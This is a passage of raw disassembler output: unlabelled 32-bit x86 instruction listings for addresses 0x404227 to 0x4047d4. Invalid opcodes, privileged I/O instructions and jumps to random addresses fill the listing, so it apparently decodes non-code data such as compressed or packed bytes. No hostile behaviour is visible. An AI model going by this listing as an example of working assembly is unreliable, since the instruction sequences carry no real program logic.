  404227:	08 17                	or     %dl,(%edi)
  404229:	1e                   	push   %ds
  40422a:	83 08 37             	orl    $0x37,(%eax)
  40422d:	6f                   	outsl  %ds:(%esi),(%dx)
  40422e:	79 ef                	jns    0x40421f
  404230:	80 c9 2c             	or     $0x2c,%cl
  404233:	97                   	xchg   %eax,%edi
  404234:	a3 ff 7f f6 0a       	mov    %eax,0xaf67fff
  404239:	05 67 c5 95 98       	add    $0x9895c567,%eax
  40423e:	e8 a9 9b 83 f1       	call   0xf1c3ddec
  404243:	b6 77                	mov    $0x77,%dh
  404245:	ab                   	stos   %eax,%es:(%edi)
  404246:	6a 09                	push   $0x9
  404248:	90                   	nop
  404249:	aa                   	stos   %al,%es:(%edi)
  40424a:	38 cb                	cmp    %cl,%bl
  40424c:	ca a9 20             	lret   $0x20a9
  40424f:	10 93 66 44 4a 49    	adc    %dl,0x494a4466(%ebx)
  404255:	c5 5d f3             	lds    -0xd(%ebp),%ebx
  404258:	6d                   	insl   (%dx),%es:(%edi)
  404259:	4e                   	dec    %esi
  40425a:	2b f3                	sub    %ebx,%esi
  40425c:	af                   	scas   %es:(%edi),%eax
  40425d:	61                   	popa
  40425e:	60                   	pusha
  40425f:	d9 6d 10             	fldcw  0x10(%ebp)
  404262:	1b 4b 6e             	sbb    0x6e(%ebx),%ecx
  404265:	5d                   	pop    %ebp
  404266:	c1 43 39 66          	roll   $0x66,0x39(%ebx)
  40426a:	ce                   	into
  40426b:	fe                   	(bad)
  40426c:	3b ed                	cmp    %ebp,%ebp
  40426e:	6e                   	outsb  %ds:(%esi),(%dx)
  40426f:	0d ac 6b 9e ce       	or     $0xce9e6bac,%eax
  404274:	dd 1f                	fstpl  (%edi)
  404276:	cc                   	int3
  404277:	c9                   	leave
  404278:	dc d2                	(bad)
  40427a:	20 78 bf             	and    %bh,-0x41(%eax)
  40427d:	c0 a3 e3 b0 a9 d7 e2 	shlb   $0xe2,-0x28564f1d(%ebx)
  404284:	90                   	nop
  404285:	d3 21                	shll   %cl,(%ecx)
  404287:	28 87 d2 f3 0e ea    	sub    %al,-0x15f10c2e(%edi)
  40428d:	f1                   	int1
  40428e:	e9 5f fa 55 a5       	jmp    0xa5963cf2
  404293:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  404294:	b5 aa                	mov    $0xaa,%ch
  404296:	d6                   	salc
  404297:	bc e7 4e 35 cd       	mov    $0xcd354ee7,%esp
  40429c:	37                   	aaa
  40429d:	76 1d                	jbe    0x4042bc
  40429f:	00 de                	add    %bl,%dh
  4042a1:	32 df                	xor    %bh,%bl
  4042a3:	a8 23                	test   $0x23,%al
  4042a5:	cd 60                	int    $0x60
  4042a7:	77 08                	ja     0x4042b1
  4042a9:	ae                   	scas   %es:(%edi),%al
  4042aa:	e2 ed                	loop   0x404299
  4042ac:	35 f3 4b 73 78       	xor    $0x78734bf3,%eax
  4042b1:	6e                   	outsb  %ds:(%esi),(%dx)
  4042b2:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4042b3:	f3 f0 58             	repz lock pop %eax
  4042b6:	f5                   	cmc
  4042b7:	33 fd                	xor    %ebp,%edi
  4042b9:	da dd                	fcmovu %st(5),%st
  4042bb:	13 02                	adc    (%edx),%eax
  4042bd:	dd 7b 0a             	fnstsw 0xa(%ebx)
  4042c0:	cf                   	iret
  4042c1:	f1                   	int1
  4042c2:	d3 18                	rcrl   %cl,(%eax)
  4042c4:	02 89 f9 43 98 5e    	add    0x5e9843f9(%ecx),%cl
  4042ca:	53                   	push   %ebx
  4042cb:	b3 fc                	mov    $0xfc,%bl
  4042cd:	0c ae                	or     $0xae,%al
  4042cf:	bd ee c9 b7 aa       	mov    $0xaab7c9ee,%ebp
  4042d4:	f6 4a 6c 05          	testb  $0x5,0x6c(%edx)
  4042d8:	ff 71 ea             	push   -0x16(%ecx)
  4042db:	3e 58                	ds pop %eax
  4042dd:	be 69 83 96 07       	mov    $0x7968369,%esi
  4042e2:	bf cd 3a d5 b8       	mov    $0xb8d53acd,%edi
  4042e7:	1b 67 e6             	sbb    -0x1a(%edi),%esp
  4042ea:	b8 0d 76 9b fa       	mov    $0xfa9b760d,%eax
  4042ef:	4e                   	dec    %esi
  4042f0:	6e                   	outsb  %ds:(%esi),(%dx)
  4042f1:	94                   	xchg   %eax,%esp
  4042f2:	1a 23                	sbb    (%ebx),%ah
  4042f4:	09 81 b4 77 99 01    	or     %eax,0x19977b4(%ecx)
  4042fa:	99                   	cltd
  4042fb:	51                   	push   %ecx
  4042fc:	19 2d 3c 48 e8 1f    	sbb    %ebp,0x1fe8483c
  404302:	af                   	scas   %es:(%edi),%eax
  404303:	bd f3 a3 fc b9       	mov    $0xb9fca3f3,%ebp
  404308:	d4 7b                	aam    $0x7b
  40430a:	f1                   	int1
  40430b:	0e                   	push   %cs
  40430c:	17                   	pop    %ss
  40430d:	4e                   	dec    %esi
  40430e:	64 fb                	fs sti
  404310:	07                   	pop    %es
  404311:	f6 74 67 0d          	divb   0xd(%edi,%eiz,2)
  404315:	73 27                	jae    0x40433e
  404317:	41                   	inc    %ecx
  404318:	30 91 a5 7c 77 e4    	xor    %dl,-0x1b88835b(%ecx)
  40431e:	5f                   	pop    %edi
  40431f:	cf                   	iret
  404320:	af                   	scas   %es:(%edi),%eax
  404321:	2f                   	das
  404322:	7e 0d                	jle    0x404331
  404324:	dc ff                	fdivr  %st,%st(7)
  404326:	73 59                	jae    0x404381
  404328:	82 26 7f             	andb   $0x7f,(%esi)
  40432b:	4b                   	dec    %ebx
  40432c:	8f c5                	pop    %ebp
  40432e:	b3 9b                	mov    $0x9b,%bl
  404330:	df b6 dc 40 13 92    	fbstp  -0x6decbf24(%esi)
  404336:	bf 0f e8 09 b0       	mov    $0xb009e80f,%edi
  40433b:	a1 4d 7a 96 bd       	mov    0xbd967a4d,%eax
  404340:	2c b5                	sub    $0xb5,%al
  404342:	95                   	xchg   %eax,%ebp
  404343:	04 0e                	add    $0xe,%al
  404345:	b7 bd                	mov    $0xbd,%bh
  404347:	f7 ed                	imul   %ebp
  404349:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40434a:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40434b:	c3                   	ret
  40434c:	32 76 1f             	xor    0x1f(%esi),%dh
  40434f:	3b 08                	cmp    (%eax),%ecx
  404351:	15 30 a5 20 9c       	adc    $0x9c20a530,%eax
  404356:	f5                   	cmc
  404357:	26 42                	es inc %edx
  404359:	b0 40                	mov    $0x40,%al
  40435b:	12 49 fc             	adc    -0x4(%ecx),%cl
  40435e:	d4 57                	aam    $0x57
  404360:	e8 72 77 d1 9c       	call   0x9d11bad7
  404365:	46                   	inc    %esi
  404366:	17                   	pop    %ss
  404367:	91                   	xchg   %eax,%ecx
  404368:	66 b1 c5             	data16 mov $0xc5,%cl
  40436b:	a3 bb dd 66 d9       	mov    %eax,0xd966ddbb
  404370:	e6 d6                	out    %al,$0xd6
  404372:	97                   	xchg   %eax,%edi
  404373:	7e 20                	jle    0x404395
  404375:	ba 7a 5c 03 31       	mov    $0x31035c7a,%edx
  40437a:	6f                   	outsl  %ds:(%esi),(%dx)
  40437b:	f7 7d a2             	idivl  -0x5e(%ebp)
  40437e:	51                   	push   %ecx
  40437f:	fd                   	std
  404380:	65 a3 a7 f8 62 ff    	mov    %eax,%gs:0xff62f8a7
  404386:	14 58                	adc    $0x58,%al
  404388:	cd 81                	int    $0x81
  40438a:	3e 24 58             	ds and $0x58,%al
  40438d:	91                   	xchg   %eax,%ecx
  40438e:	c5 42 7f             	lds    0x7f(%edx),%eax
  404391:	78 d1                	js     0x404364
  404393:	e2 39                	loop   0x4043ce
  404395:	c4 2d 66 5b d8 34    	les    0x34d85b66,%ebp
  40439b:	4d                   	dec    %ebp
  40439c:	62 24 aa             	bound  %esp,(%edx,%ebp,4)
  40439f:	93                   	xchg   %eax,%ebx
  4043a0:	01 9b 79 0e b5 6e    	add    %ebx,0x6eb50e79(%ebx)
  4043a6:	2a cd                	sub    %ch,%cl
  4043a8:	7f d9                	jg     0x404383
  4043aa:	cf                   	iret
  4043ab:	e7 d4                	out    %eax,$0xd4
  4043ad:	05 db 12 ff fe       	add    $0xfeff12db,%eax
  4043b2:	0d be 39 e2 51       	or     $0x51e239be,%eax
  4043b7:	9a 1c 59 44 36 96 ca 	lcall  $0xca96,$0x3644591c
  4043be:	ed                   	in     (%dx),%eax
  4043bf:	3b 7e cb             	cmp    -0x35(%esi),%edi
  4043c2:	d6                   	salc
  4043c3:	37                   	aaa
  4043c4:	7b 27                	jnp    0x4043ed
  4043c6:	31 90 e6 a9 fb 9e    	xor    %edx,-0x6104561a(%eax)
  4043cc:	8e 46 fd             	mov    -0x3(%esi),%es
  4043cf:	84 98 a0 9b 27 52    	test   %bl,0x52279ba0(%eax)
  4043d5:	ec                   	in     (%dx),%al
  4043d6:	6d                   	insl   (%dx),%es:(%edi)
  4043d7:	a1 74 00 d4 8c       	mov    0x8cd40074,%eax
  4043dc:	7b 4c                	jnp    0x40442a
  4043de:	23 d1                	and    %ecx,%edx
  4043e0:	1a c3                	sbb    %bl,%al
  4043e2:	94                   	xchg   %eax,%esp
  4043e3:	4f                   	dec    %edi
  4043e4:	ce                   	into
  4043e5:	96                   	xchg   %eax,%esi
  4043e6:	30 0c 98             	xor    %cl,(%eax,%ebx,4)
  4043e9:	01 99 21 ed 2d 7e    	add    %ebx,0x7e2ded21(%ecx)
  4043ef:	56                   	push   %esi
  4043f0:	18 27                	sbb    %ah,(%edi)
  4043f2:	66 fd                	data16 std
  4043f4:	52                   	push   %edx
  4043f5:	0a bd dc 35 81 e3    	or     -0x1c7eca24(%ebp),%bh
  4043fb:	72 af                	jb     0x4043ac
  4043fd:	f2 f8                	repnz clc
  4043ff:	7a 97                	jp     0x404398
  404401:	f3 e8 70 94 4f 25    	repz call 0x258fd877
  404407:	cb                   	lret
  404408:	ff d1                	call   *%ecx
  40440a:	48                   	dec    %eax
  40440b:	d8 a7 6e ac c7 b1    	fsubs  -0x4e385392(%edi)
  404411:	c8 b5 66 6b          	enter  $0x66b5,$0x6b
  404415:	14 10                	adc    $0x10,%al
  404417:	df 8d 28 f0 ca 94    	fisttps -0x6b350fd8(%ebp)
  40441d:	74 ef                	je     0x40440e
  40441f:	0f 33                	rdpmc
  404421:	eb 47                	jmp    0x40446a
  404423:	8f                   	(bad)
  404424:	e7 be                	out    %eax,$0xbe
  404426:	3a 4d b1             	cmp    -0x4f(%ebp),%cl
  404429:	29 9a 5f 06 56 77    	sub    %ebx,0x7756065f(%edx)
  40442f:	91                   	xchg   %eax,%ecx
  404430:	31 4f d6             	xor    %ecx,-0x2a(%edi)
  404433:	3d 6b 32 4f 1f       	cmp    $0x1f4f326b,%eax
  404438:	4e                   	dec    %esi
  404439:	a9 38 b0 c8 1a       	test   $0x1ac8b038,%eax
  40443e:	9c                   	pushf
  40443f:	bb b0 1b a2 ad       	mov    $0xada21bb0,%ebx
  404444:	ad                   	lods   %ds:(%esi),%eax
  404445:	77 ff                	ja     0x404446
  404447:	0a 18                	or     (%eax),%bl
  404449:	fa                   	cli
  40444a:	b8 15 c0 96 04       	mov    $0x496c015,%eax
  40444f:	00 ca                	add    %cl,%dl
  404451:	f0 a5                	lock movsl %ds:(%esi),%es:(%edi)
  404453:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  404454:	84 3c 52             	test   %bh,(%edx,%edx,2)
  404457:	1c a6                	sbb    $0xa6,%al
  404459:	50                   	push   %eax
  40445a:	2f                   	das
  40445b:	09 ad 9c f9 49 4c    	or     %ebp,0x4c49f99c(%ebp)
  404461:	13 06                	adc    (%esi),%eax
  404463:	cd 00                	int    $0x0
  404465:	e7 dc                	out    %eax,$0xdc
  404467:	8e ca                	mov    %edx,%cs
  404469:	51                   	push   %ecx
  40446a:	b3 9c                	mov    $0x9c,%bl
  40446c:	1f                   	pop    %ds
  40446d:	7e 80                	jle    0x4043ef
  40446f:	ca 4a 77             	lret   $0x774a
  404472:	7a 7f                	jp     0x4044f3
  404474:	84 5a 05             	test   %bl,0x5(%edx)
  404477:	5b                   	pop    %ebx
  404478:	67 d1 7c eb          	sarl   $1,-0x15(%si)
  40447c:	e1 42                	loope  0x4044c0
  40447e:	6f                   	outsl  %ds:(%esi),(%dx)
  40447f:	eb ce                	jmp    0x40444f
  404481:	43                   	inc    %ebx
  404482:	5d                   	pop    %ebp
  404483:	e9 bd 8e ba 48       	jmp    0x48fad345
  404488:	35 34 1b 60 d9       	xor    $0xd9601b34,%eax
  40448d:	be b9 2e e9 0a       	mov    $0xae92eb9,%esi
  404492:	61                   	popa
  404493:	cd a7                	int    $0xa7
  404495:	64 0d 5c 92 70 ca    	fs or  $0xca70925c,%eax
  40449b:	b3 45                	mov    $0x45,%bl
  40449d:	7e d3                	jle    0x404472
  40449f:	a2 4e 3d e1 bd       	mov    %al,0xbde13d4e
  4044a4:	42                   	inc    %edx
  4044a5:	89 bd e9 c5 68 61    	mov    %edi,0x6168c5e9(%ebp)
  4044ab:	fa                   	cli
  4044ac:	ba 87 27 9c 39       	mov    $0x399c2787,%edx
  4044b1:	fe 0d 73 63 7d 3f    	decb   0x3f7d6373
  4044b7:	91                   	xchg   %eax,%ecx
  4044b8:	93                   	xchg   %eax,%ebx
  4044b9:	fd                   	std
  4044ba:	17                   	pop    %ss
  4044bb:	77 28                	ja     0x4044e5
  4044bd:	3e 5b                	ds pop %ebx
  4044bf:	11 26                	adc    %esp,(%esi)
  4044c1:	95                   	xchg   %eax,%ebp
  4044c2:	e7 d8                	out    %eax,$0xd8
  4044c4:	d4 cd                	aam    $0xcd
  4044c6:	61                   	popa
  4044c7:	86 4e 58             	xchg   %cl,0x58(%esi)
  4044ca:	b9 8e f2 e6 72       	mov    $0x72e6f28e,%ecx
  4044cf:	7d 0d                	jge    0x4044de
  4044d1:	13 44 47 6a          	adc    0x6a(%edi,%eax,2),%eax
  4044d5:	8e 92 b9 f0 11 ec    	mov    -0x13ee0f47(%edx),%ss
  4044db:	64 3f                	fs aas
  4044dd:	9e                   	sahf
  4044de:	2d 1e 98 9a 8e       	sub    $0x8e9a981e,%eax
  4044e3:	fb                   	sti
  4044e4:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4044e5:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4044e6:	72 27                	jb     0x40450f
  4044e8:	de 92 0d 37 f3 75    	ficoms 0x75f3370d(%edx)
  4044ee:	8a d9                	mov    %cl,%bl
  4044f0:	8b 7c e9 5c          	mov    0x5c(%ecx,%ebp,8),%edi
  4044f4:	ff e4                	jmp    *%esp
  4044f6:	3c af                	cmp    $0xaf,%al
  4044f8:	94                   	xchg   %eax,%esp
  4044f9:	ad                   	lods   %ds:(%esi),%eax
  4044fa:	2d 4b be 61 78       	sub    $0x7861be4b,%eax
  4044ff:	5e                   	pop    %esi
  404500:	3a 89 aa 36 66 b5    	cmp    -0x4a99c956(%ecx),%cl
  404506:	08 a4 42 ab 72 ec 67 	or     %ah,0x67ec72ab(%edx,%eax,2)
  40450d:	97                   	xchg   %eax,%edi
  40450e:	5a                   	pop    %edx
  40450f:	b7 03                	mov    $0x3,%bh
  404511:	1d c7 ea 7d 49       	sbb    $0x497deac7,%eax
  404516:	b2 e6                	mov    $0xe6,%dl
  404518:	04 31                	add    $0x31,%al
  40451a:	87 63 74             	xchg   %esp,0x74(%ebx)
  40451d:	f8                   	clc
  40451e:	e9 63 d0 3c b6       	jmp    0xb67d1586
  404523:	c6                   	(bad)
  404524:	bc b7 38 65 f7       	mov    $0xf76538b7,%esp
  404529:	be ca 0f 18 9e       	mov    $0x9e180fca,%esi
  40452e:	45                   	inc    %ebp
  40452f:	13 b5 ac cb bb 18    	adc    0x18bbcbac(%ebp),%esi
  404535:	0d fe f4 f5 c6       	or     $0xc6f5f4fe,%eax
  40453a:	e3 9a                	jecxz  0x4044d6
  40453c:	d7                   	xlat   %ds:(%ebx)
  40453d:	a1 0b 9c 53 b7       	mov    0xb7539c0b,%eax
  404542:	45                   	inc    %ebp
  404543:	b5 53                	mov    $0x53,%ch
  404545:	e3 c2                	jecxz  0x404509
  404547:	d9 62 2d             	fldenv 0x2d(%edx)
  40454a:	d2 d5                	rcl    %cl,%ch
  40454c:	91                   	xchg   %eax,%ecx
  40454d:	b0 35                	mov    $0x35,%al
  40454f:	2f                   	das
  404550:	fe 81 a9 72 b6 2e    	incb   0x2eb672a9(%ecx)
  404556:	50                   	push   %eax
  404557:	69 d4 38 7a 87 73    	imul   $0x73877a38,%esp,%edx
  40455d:	df 5a a3             	fistps -0x5d(%edx)
  404560:	92                   	xchg   %eax,%edx
  404561:	68 71 04 d1 d9       	push   $0xd9d10471
  404566:	88 89 10 e7 81 c2    	mov    %cl,-0x3d7e18f0(%ecx)
  40456c:	33 c6                	xor    %esi,%eax
  40456e:	00 53 cc             	add    %dl,-0x34(%ebx)
  404571:	af                   	scas   %es:(%edi),%eax
  404572:	92                   	xchg   %eax,%edx
  404573:	f9                   	stc
  404574:	31 31                	xor    %esi,(%ecx)
  404576:	91                   	xchg   %eax,%ecx
  404577:	3e 0e                	ds push %cs
  404579:	ef                   	out    %eax,(%dx)
  40457a:	98                   	cwtl
  40457b:	f4                   	hlt
  40457c:	f8                   	clc
  40457d:	e9 e1 bc 58 68       	jmp    0x68990263
  404582:	25 d8 6a 2b f2       	and    $0xf22b6ad8,%eax
  404587:	a1 02 fb a8 35       	mov    0x35a8fb02,%eax
  40458c:	bb d7 d0 6f c0       	mov    $0xc06fd0d7,%ebx
  404591:	72 c9                	jb     0x40455c
  404593:	ea ae 6e e0 5a 12 9f 	ljmp   $0x9f12,$0x5ae06eae
  40459a:	37                   	aaa
  40459b:	be 9d 07 16 e5       	mov    $0xe516079d,%esi
  4045a0:	c4 a0 2c 42 ec 21    	les    0x21ec422c(%eax),%esp
  4045a6:	9e                   	sahf
  4045a7:	10 7f 38             	adc    %bh,0x38(%edi)
  4045aa:	05 d6 b1 11 44       	add    $0x4411b1d6,%eax
  4045af:	82 e5 ff             	and    $0xff,%ch
  4045b2:	78 37                	js     0x4045eb
  4045b4:	4a                   	dec    %edx
  4045b5:	5f                   	pop    %edi
  4045b6:	5d                   	pop    %ebp
  4045b7:	73 07                	jae    0x4045c0
  4045b9:	fd                   	std
  4045ba:	39 7e 59             	cmp    %edi,0x59(%esi)
  4045bd:	48                   	dec    %eax
  4045be:	bd 9d f7 b0 5a       	mov    $0x5ab0f79d,%ebp
  4045c3:	74 bb                	je     0x404580
  4045c5:	ef                   	out    %eax,(%dx)
  4045c6:	50                   	push   %eax
  4045c7:	20 e4                	and    %ah,%ah
  4045c9:	21 1f                	and    %ebx,(%edi)
  4045cb:	7a d4                	jp     0x4045a1
  4045cd:	ff 8f ab a2 b1 84    	decl   -0x7b4e5d55(%edi)
  4045d3:	28 c3                	sub    %al,%bl
  4045d5:	8c f9                	mov    %?,%ecx
  4045d7:	17                   	pop    %ss
  4045d8:	29 c7                	sub    %eax,%edi
  4045da:	f2 f9                	repnz stc
  4045dc:	b4 54                	mov    $0x54,%ah
  4045de:	c5 22                	lds    (%edx),%esp
  4045e0:	dd cc                	(bad)
  4045e2:	cf                   	iret
  4045e3:	73 05                	jae    0x4045ea
  4045e5:	4a                   	dec    %edx
  4045e6:	5f                   	pop    %edi
  4045e7:	68 8a 60 e8 25       	push   $0x25e8608a
  4045ec:	ca 39 f9             	lret   $0xf939
  4045ef:	ae                   	scas   %es:(%edi),%al
  4045f0:	f1                   	int1
  4045f1:	07                   	pop    %es
  4045f2:	61                   	popa
  4045f3:	51                   	push   %ecx
  4045f4:	c4 32                	les    (%edx),%esi
  4045f6:	42                   	inc    %edx
  4045f7:	91                   	xchg   %eax,%ecx
  4045f8:	31 ca                	xor    %ecx,%edx
  4045fa:	f8                   	clc
  4045fb:	fd                   	std
  4045fc:	13 48 fb             	adc    -0x5(%eax),%ecx
  4045ff:	26 ef                	es out %eax,(%dx)
  404601:	26 0d a3 d9 00 53    	es or  $0x5300d9a3,%eax
  404607:	3e ec                	ds in  (%dx),%al
  404609:	47                   	inc    %edi
  40460a:	c5 a8 b2 45 40 f8    	lds    -0x7bfba4e(%eax),%ebp
  404610:	b6 c6                	mov    $0xc6,%dh
  404612:	31 51 d4             	xor    %edx,-0x2c(%ecx)
  404615:	94                   	xchg   %eax,%esp
  404616:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  404617:	18 6d 1c             	sbb    %ch,0x1c(%ebp)
  40461a:	88 1c cb             	mov    %bl,(%ebx,%ecx,8)
  40461d:	5c                   	pop    %esp
  40461e:	e0 a1                	loopne 0x4045c1
  404620:	78 20                	js     0x404642
  404622:	af                   	scas   %es:(%edi),%eax
  404623:	97                   	xchg   %eax,%edi
  404624:	0f 7d                	(bad)
  404626:	3a d2                	cmp    %dl,%dl
  404628:	77 da                	ja     0x404604
  40462a:	bc 39 82 59 e7       	mov    $0xe7598239,%esp
  40462f:	11 f5                	adc    %esi,%ebp
  404631:	cf                   	iret
  404632:	1e                   	push   %ds
  404633:	f4                   	hlt
  404634:	d0 5a fd             	rcrb   $1,-0x3(%edx)
  404637:	ca 4c 89             	lret   $0x894c
  40463a:	98                   	cwtl
  40463b:	3b 2c 74             	cmp    (%esp,%esi,2),%ebp
  40463e:	39 66 08             	cmp    %esp,0x8(%esi)
  404641:	4f                   	dec    %edi
  404642:	ca e2 89             	lret   $0x89e2
  404645:	3c 0e                	cmp    $0xe,%al
  404647:	7c 01                	jl     0x40464a
  404649:	58                   	pop    %eax
  40464a:	8c e6                	mov    %fs,%esi
  40464c:	cb                   	lret
  40464d:	6b d6 3d             	imul   $0x3d,%esi,%edx
  404650:	ef                   	out    %eax,(%dx)
  404651:	6c                   	insb   (%dx),%es:(%edi)
  404652:	71 3c                	jno    0x404690
  404654:	c5 99 74 50 a6 75    	lds    0x75a65074(%ecx),%ebx
  40465a:	de a3 c3 a1 bd e7    	fisubs -0x18425e3d(%ebx)
  404660:	b0 b5                	mov    $0xb5,%al
  404662:	95                   	xchg   %eax,%ebp
  404663:	2a 2a                	sub    (%edx),%ch
  404665:	de e5                	fsubp  %st,%st(5)
  404667:	0f 90 06             	seto   (%esi)
  40466a:	7a 0c                	jp     0x404678
  40466c:	8f 81 a2 4b 1f fd    	pop    -0x2e0b45e(%ecx)
  404672:	b4 20                	mov    $0x20,%ah
  404674:	e3 ed                	jecxz  0x404663
  404676:	9e                   	sahf
  404677:	08 65 b7             	or     %ah,-0x49(%ebp)
  40467a:	40                   	inc    %eax
  40467b:	70 65                	jo     0x4046e2
  40467d:	37                   	aaa
  40467e:	69 aa 3f 4f 7a dc 5d 	imul   $0xc2cb9b5d,-0x2385b0c1(%edx),%ebp
  404685:	9b cb c2 
  404688:	0b 80 47 20 f5 9a    	or     -0x650adfb9(%eax),%eax
  40468e:	fe 49 08             	decb   0x8(%ecx)
  404691:	95                   	xchg   %eax,%ebp
  404692:	2a 5a a8             	sub    -0x58(%edx),%bl
  404695:	ff                   	(bad)
  404696:	7b c9                	jnp    0x404661
  404698:	87 75 65             	xchg   %esi,0x65(%ebp)
  40469b:	1e                   	push   %ds
  40469c:	23 cb                	and    %ebx,%ecx
  40469e:	03 2f                	add    (%edi),%ebp
  4046a0:	c9                   	leave
  4046a1:	dd 54 6e 38          	fstl   0x38(%esi,%ebp,2)
  4046a5:	2d a1 4d ad 34       	sub    $0x34ad4da1,%eax
  4046aa:	57                   	push   %edi
  4046ab:	5b                   	pop    %ebx
  4046ac:	a0 f1 d2 8b 38       	mov    0x388bd2f1,%al
  4046b1:	25 72 5c 87 01       	and    $0x1875c72,%eax
  4046b6:	5a                   	pop    %edx
  4046b7:	46                   	inc    %esi
  4046b8:	7a f7                	jp     0x4046b1
  4046ba:	f7 ad 7e 59 09 e0    	imull  -0x1ff6a682(%ebp)
  4046c0:	78 bd                	js     0x40467f
  4046c2:	d4 6d                	aam    $0x6d
  4046c4:	8c e6                	mov    %fs,%esi
  4046c6:	ad                   	lods   %ds:(%esi),%eax
  4046c7:	06                   	push   %es
  4046c8:	04 95                	add    $0x95,%al
  4046ca:	d7                   	xlat   %ds:(%ebx)
  4046cb:	58                   	pop    %eax
  4046cc:	cb                   	lret
  4046cd:	e6 9f                	out    %al,$0x9f
  4046cf:	96                   	xchg   %eax,%esi
  4046d0:	2e 9d                	cs popf
  4046d2:	25 21 1e 1f 6d       	and    $0x6d1f1e21,%eax
  4046d7:	66 98                	cbtw
  4046d9:	35 dc a3 c3 f4       	xor    $0xf4c3a3dc,%eax
  4046de:	bc 17 fa 05 10       	mov    $0x1005fa17,%esp
  4046e3:	a8 66                	test   $0x66,%al
  4046e5:	5d                   	pop    %ebp
  4046e6:	7c 95                	jl     0x40467d
  4046e8:	22 48 b7             	and    -0x49(%eax),%cl
  4046eb:	bc 92 1f ae 44       	mov    $0x44ae1f92,%esp
  4046f0:	80 4c d0 bf 86       	orb    $0x86,-0x41(%eax,%edx,8)
  4046f5:	38 1a                	cmp    %bl,(%edx)
  4046f7:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4046f8:	2d c2 37 db cd       	sub    $0xcddb37c2,%eax
  4046fd:	e0 fc                	loopne 0x4046fb
  4046ff:	9f                   	lahf
  404700:	6d                   	insl   (%dx),%es:(%edi)
  404701:	1a 70 ac             	sbb    -0x54(%eax),%dh
  404704:	b0 20                	mov    $0x20,%al
  404706:	61                   	popa
  404707:	64 e2 10             	fs loop 0x40471a
  40470a:	f3 c2 c1 25          	repz ret $0x25c1
  40470e:	5d                   	pop    %ebp
  40470f:	f4                   	hlt
  404710:	66 45                	inc    %bp
  404712:	fe                   	(bad)
  404713:	76 12                	jbe    0x404727
  404715:	61                   	popa
  404716:	10 ce                	adc    %cl,%dh
  404718:	4d                   	dec    %ebp
  404719:	a2 68 e6 de 67       	mov    %al,0x67dee668
  40471e:	6c                   	insb   (%dx),%es:(%edi)
  40471f:	55                   	push   %ebp
  404720:	13 2a                	adc    (%edx),%ebp
  404722:	da eb                	(bad)
  404724:	65 dc 58 c6          	fcompl %gs:-0x3a(%eax)
  404728:	3b 70 74             	cmp    0x74(%eax),%esi
  40472b:	e0 c9                	loopne 0x4046f6
  40472d:	1f                   	pop    %ds
  40472e:	62 85 9b 08 92 fd    	bound  %eax,-0x26df765(%ebp)
  404734:	9f                   	lahf
  404735:	64 d7                	xlat   %fs:(%ebx)
  404737:	9a 52 ea f2 1c ce 18 	lcall  $0x18ce,$0x1cf2ea52
  40473e:	b8 dd 80 1a 20       	mov    $0x201a80dd,%eax
  404743:	ca b9 ec             	lret   $0xecb9
  404746:	7e f2                	jle    0x40473a
  404748:	c3                   	ret
  404749:	00 52 ff             	add    %dl,-0x1(%edx)
  40474c:	25 4f 63 22 7f       	and    $0x7f22634f,%eax
  404751:	6d                   	insl   (%dx),%es:(%edi)
  404752:	bd b6 50 9d cb       	mov    $0xcb9d50b6,%ebp
  404757:	0b 62 db             	or     -0x25(%edx),%esp
  40475a:	26 49                	es dec %ecx
  40475c:	e6 85                	out    %al,$0x85
  40475e:	25 e8 3d 52 95       	and    $0x95523de8,%eax
  404763:	2d 79 6b 27 04       	sub    $0x4276b79,%eax
  404768:	54                   	push   %esp
  404769:	9e                   	sahf
  40476a:	40                   	inc    %eax
  40476b:	39 e2                	cmp    %esp,%edx
  40476d:	47                   	inc    %edi
  40476e:	1b d0                	sbb    %eax,%edx
  404770:	bd 21 42 1b f8       	mov    $0xf81b4221,%ebp
  404775:	aa                   	stos   %al,%es:(%edi)
  404776:	06                   	push   %es
  404777:	ea 31 32 c5 d6 83 68 	ljmp   $0x6883,$0xd6c53231
  40477e:	12 23                	adc    (%ebx),%ah
  404780:	98                   	cwtl
  404781:	be 24 f8 c3 19       	mov    $0x19c3f824,%esi
  404786:	20 07                	and    %al,(%edi)
  404788:	d4 08                	aam    $0x8
  40478a:	3d 91 1b c4 3b       	cmp    $0x3bc41b91,%eax
  40478f:	4b                   	dec    %ebx
  404790:	9e                   	sahf
  404791:	b5 3b                	mov    $0x3b,%ch
  404793:	59                   	pop    %ecx
  404794:	f4                   	hlt
  404795:	4c                   	dec    %esp
  404796:	a3 6f 6a 0c c2       	mov    %eax,0xc20c6a6f
  40479b:	27                   	daa
  40479c:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40479d:	76 b6                	jbe    0x404755
  40479f:	7f 37                	jg     0x4047d8
  4047a1:	42                   	inc    %edx
  4047a2:	8f                   	(bad)
  4047a3:	90                   	nop
  4047a4:	6d                   	insl   (%dx),%es:(%edi)
  4047a5:	6c                   	insb   (%dx),%es:(%edi)
  4047a6:	e0 3a                	loopne 0x4047e2
  4047a8:	7d c6                	jge    0x404770
  4047aa:	fb                   	sti
  4047ab:	72 f9                	jb     0x4047a6
  4047ad:	14 c2                	adc    $0xc2,%al
  4047af:	0d d6 4d eb 4e       	or     $0x4eeb4dd6,%eax
  4047b4:	7e f5                	jle    0x4047ab
  4047b6:	c1 27 4c             	shll   $0x4c,(%edi)
  4047b9:	49                   	dec    %ecx
  4047ba:	87 05 93 b0 68 39    	xchg   %eax,0x3968b093
  4047c0:	50                   	push   %eax
  4047c1:	88 85 15 d9 5d f7    	mov    %al,-0x8a226eb(%ebp)
  4047c7:	6c                   	insb   (%dx),%es:(%edi)
  4047c8:	8c 08                	mov    %cs,(%eax)
  4047ca:	4f                   	dec    %edi
  4047cb:	35 cb 13 f4 f3       	xor    $0xf3f413cb,%eax
  4047d0:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4047d1:	dd f6                	(bad)
  4047d3:	92                   	xchg   %eax,%edx
  4047d4:	62 5a 5e             	bound  %ebx,0x5e(%edx)
